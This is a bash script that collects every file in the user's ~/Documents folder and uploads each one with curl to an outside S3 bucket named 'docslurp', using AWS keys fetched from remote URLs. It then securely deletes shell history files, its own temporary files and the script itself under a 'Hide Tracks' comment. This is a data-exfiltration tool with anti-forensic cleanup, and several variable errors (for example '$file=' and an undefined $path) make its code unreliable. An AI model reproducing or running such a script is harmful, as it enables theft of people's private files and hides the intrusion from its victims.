#!/bin/bash

#Edit and uncomment key_id and key_secret to the link where your AWS key is
#key_id="$(curl -s https://link-to-key-file.com/key)"
#key_secret="$(curl -s https://link-to-secret-key-file.com/secret-key)"
$file="$n.zip"
fpath="data/$file"
bucket="docslurp"
content_type="application/octet-stream"
date="$(LC_ALL=C date -u +"%a, %d %b %Y %X %z")"
md5="$(openssl md5 -binary < "$file" | base64)"
sig="$(printf "PUT\n$md5\n$content_type\n$date\n/$bucket/$fpath" | openssl sha1 -binary -hmac "$key_secret" | base64)"

#Get a list of all files in ~/Documents
find ~/Documents -type f >> /tmp/files

function upload_files {
curl -T $file http://$bucket.s3.amazonaws.com/$path \
    -H "Date: $date" \
    -H "Authorization: AWS $key_id:$sig" \
    -H "Content-Type: $content_type" \
    -H "Content-MD5: $md5"
}

for n in $(cat /tmp/files); do

	upload_files $n
done

# Clean up/Hide Tracks
srm -m ~/.*_history
srm -m /tmp/files
srm -m docs.zip
srm -m uploader.sh
srm -m nohup.out
